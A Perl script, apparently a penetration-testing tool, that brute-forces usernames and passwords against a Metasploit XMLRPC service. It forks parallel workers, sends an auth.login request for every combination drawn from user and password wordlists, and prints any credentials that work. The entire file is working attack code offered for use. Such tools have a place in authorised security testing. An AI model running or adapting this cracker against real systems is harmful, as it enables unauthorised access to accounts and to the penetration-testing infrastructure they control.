#!/usr/bin/perl
# Metasploit XMLRPC password cracker
# Copyright (C) Vlatko Kosturjak, Kost. Distributed under GPL

use strict;
use IO::Socket::SSL;
use Getopt::Long;

my $verbose = 0;
my $mx_host = "localhost";
my $mx_port = "55553";
my $timeout = 15;
my $userfile;
my $passfile;
my $maxreq = 16;
my $usessl = 0;

my @childs;
my $ch=0;
my $total=0;

my $pid = 1;
my $loop = 1;

Getopt::Long::Configure ("bundling");

my $result = GetOptions (
	"i|ip=s" => \$mx_host,
	"p|port=i" => \$mx_port,
	"U|users=s" => \$userfile,
	"P|passwords=s" => \$passfile,
	"m|maxreq=i" => \$maxreq,
	"t|timeout=i" => \$timeout,
	"v|verbose+"  => \$verbose,
	"s|ssl"	=> \$usessl,
	"h|help" => \&help
);

unless ($userfile and $passfile) {
	help();
}

print STDERR "Metasploit XMLRPC password cracker. (C) Kost. Distributed under GPL.\n\n";

open(USER,"<$userfile") or die ("cannot open user file $userfile: $!");
open(PASS,"<$passfile") or die ("cannot open password file $passfile: $!");

print STDERR "[i] Cracking.\n";

my $userglob = <USER>;
chomp $userglob;

$SIG{INT} = \&ctrlc;
my %comb;
while ($loop) {
	if ($pid) {
		# print STDERR "Main/Parent\n";
		%comb = getcomb();

		if ($comb{'nomore'} == 1) {
			$loop = 0;
			next;
		} 
		if ($ch<$maxreq) {
			$ch++;
			# print STDERR "Forking $ch\n";
			$pid = fork();
			die ("[e] cannot fork: $!") if (!defined($pid));
			if ($pid) {
				push @childs, $pid;
				$total++;
			}
		} else {
			# wait for children to die
			while ($#childs>0) {
				#print STDERR "waiting to die\n";
				if (my $oldpid=waitpid(-1, 0)) {
					# print STDERR "Oldpid: $oldpid\n";
					foreach my $i (0 .. $#childs) {
						next if ($oldpid);
						if ($childs[$i] eq $oldpid) {
							delete $childs[$i];
							last;
						}
					}
					$total++;
					$pid = fork();
					die ("[e] cannot fork in wait: $!") if (!defined($pid)); 
					if ($pid) {
						push @childs, $pid;
						last if ($loop==0);
					} else {
						last;# if children skip while loop

					}
					last; 				
				}
			}
			if ($pid) {%comb = getcomb();}
			next;
		}
	} 
	unless ($pid) {
		# children
		# print STDERR "Children\n";
		mx_guess($comb{'user'},$comb{'pass'});
		exit(0);
	}
}

$SIG{'INT'} = 'DEFAULT';
foreach (@childs) {
	waitpid($_, 0)
}

print STDERR "\n";
print STDERR "[i] Statistics: $total tries\n";
print STDERR "[i] END\n";

sub getcomb {
	my %comb;
	while (1) {
	unless ($comb{'pass'} = <PASS>) {
		while (1) {
			unless ($comb{'user'} = <USER>) {
				$comb{'nomore'} = 1;
				return %comb; 
			} else {
				chomp($comb{'user'});
				if ($comb{'user'} eq '') {
					next;
				} else {
					$userglob=$comb{'user'};
					seek (PASS,0,0);
					last;
				}
			}
		}
	} else {
		$comb{'user'}=$userglob;
		chomp($comb{'pass'});
		if ($comb{'pass'} eq '') {
			next;
		} else {
			last 
		}
	}
	}
	$comb{'nomore'} = 0;
	return %comb;
}

sub ctrlc {
	$SIG{INT} = \&ctrlc;
	print "\nCTRL+C presssed, stopping.\n";
	$loop=0;
}

sub mx_guess {
	my ($user, $password) = @_;
	my $mx_sock;
	if ($usessl) {
		$mx_sock = IO::Socket::SSL->new(
			  PeerAddr        => $mx_host,
			  PeerPort        => $mx_port,
			  SSL_verify_mode => 0,
			  Timeout         => $timeout
			  );
	} else {
		$mx_sock = IO::Socket::SSL->new(
			  PeerAddr        => $mx_host,
			  PeerPort        => $mx_port,
			  Timeout         => $timeout
			  );
	}	
	if(!$mx_sock) {
		warn ("[w] Cannot connect to sock: $!");
		return;
	}
	$mx_sock->autoflush();

	my $xmldata='<?xml version="1.0" ?><methodCall><methodName>auth.login</methodName><params><param><value><string>'.$user.'</string></value></param><param><value><string>'.$password.'</string></value></param></params></methodCall>'."\n\x00";
	print STDERR "[d] Sending login data: " if ($verbose>3);
	$mx_sock->print($xmldata);
	print STDERR "done!\n" if ($verbose>3);

	print STDERR "[d] Waiting for answer line: " if ($verbose>3);
	my $line = $mx_sock->getline;
	print STDERR "done!\n" if ($verbose>3);

	unless ($mx_sock->connected) {
		print STDERR "[i] Combination $user:$password: Disconnected\n" if ($verbose>0);
	}

	if($line =~ /<name>faultString<\/name><value><string>authentication error<\/string><\/value>/gis) {
		print STDERR "[i] Combination $user:$password: Wrong\n" if ($verbose>1);
	} elsif ($line =~ /<name>result<\/name><value><string>success<\/string>/gis) {
		print STDERR "[i] Combination $user:$password: Sucess\n" if ($verbose>1);
		print "[o] Success! User: $user and Password: $password\n";
	} else {
		print STDERR "[i] Combination $user:$password: Unknown\n" if ($verbose>0);
	}

	if ($usessl) {
		$mx_sock->close(SSL_ctx_free => 1);
	} else {
		$mx_sock->close();
	}
}

sub help 
{
	print "$0: Metasploit XMLRPC password cracker. \n";
	print "Copyright (C) Vlatko Kosturjak, Kost. Distributed under GPL.\n\n";
	print "Usage: $0 -s -i 127.0.0.1 -p 55553 -U userlist.txt -P passlist.txt\n\n";
	print "	-i <i>	Use hostname or IP <i> (default: $mx_host)\n";
	print "	-p <p>	Use port <p> (default: $mx_port)\n";
	print "	-U <U>	Use user list <U>\n";
	print "	-P <P>	Use password list <P>\n";
	print " -s	use SSL\n";
	print "	-m <m>	Maximum number of parallel request (default: $maxreq)\n";
	print "	-t <t>	use sock timeout <t>\n";
	print "	-v	verbose (-vv will display every combination tried)\n";
	print "	-h 	this help message\n";
	exit (0);
} 
